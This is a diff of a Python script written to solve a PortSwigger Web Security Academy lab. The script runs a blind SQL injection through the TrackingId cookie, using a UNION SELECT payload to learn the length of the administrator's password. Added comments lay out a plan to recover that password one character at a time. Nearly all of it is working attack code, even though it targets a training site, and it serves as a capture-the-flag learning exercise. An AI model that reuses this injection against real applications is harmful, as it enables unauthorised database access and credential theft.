@@ -1,3 +1,4 @@
+import string
 import urllib.parse
 import time
 import requests
@@ -7,7 +8,12 @@ from bs4 import BeautifulSoup
 # Adding this so I can use IntelliJ's play button.
 # This value is only used if none is supplied from the command line.
 MANUAL_CTF_URL = "https://ac9f1f131fa52d2ac032acd300ed00b4.web-security-academy.net/"
+# Valid characters that will be used when finding the admin's password via SIMILAR TO with regex
+VALID_CHARSET = string.ascii_lowercase + string.digits
 
+
+# Helper functions
+# -----------------
 
 # Parse site URL
 def getCtfUrl():
@@ -20,7 +26,9 @@ def getCtfUrl():
     return f'https://{site}/'
 
 
-# Helper functions
+# try_query
+# returns True when the query provided results in tricking the site backend by injecting a true statement
+# a.k.a when the WHERE clause is true, try_query returns true.
 def try_query(query):
     print(f'Query: {query}')
     my_cookies = {'TrackingId': urllib.parse.quote_plus(query)}
@@ -32,17 +40,26 @@ def try_query(query):
         return False
 
 
-# I like being able to use a play button
 if __name__ == "__main__":
     url = getCtfUrl()
 
     begin_time = time.perf_counter()
     num = 1
 
+    # Plan:
+    #   Get password length so we can use that to find out when to end password search
+    #   Maintain string var holding the password that we know so far
+    #   while length of that string is less than password length:
+    #       for char in valid char set
+    #           try query with and clause of: pw so far + new char attempt + '%'
+    #           if that try returns true, append new char to pw so far, print pw so far, and break from for loop
+    #   now pw so far should be the password, so outside of any loops just try a SIMILAR_TO query w/ that pw to confirm
+
     while True:
-        query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
+        and_clause = f'length(password)={num}'
+        attempt_qry = f"x' UNION SELECT username FROM users WHERE username='administrator' AND {and_clause}--"
         print(f'Trying length {num}')
-        if not try_query(query):
+        if not try_query(attempt_qry):
             num = num + 1
         else:
             break
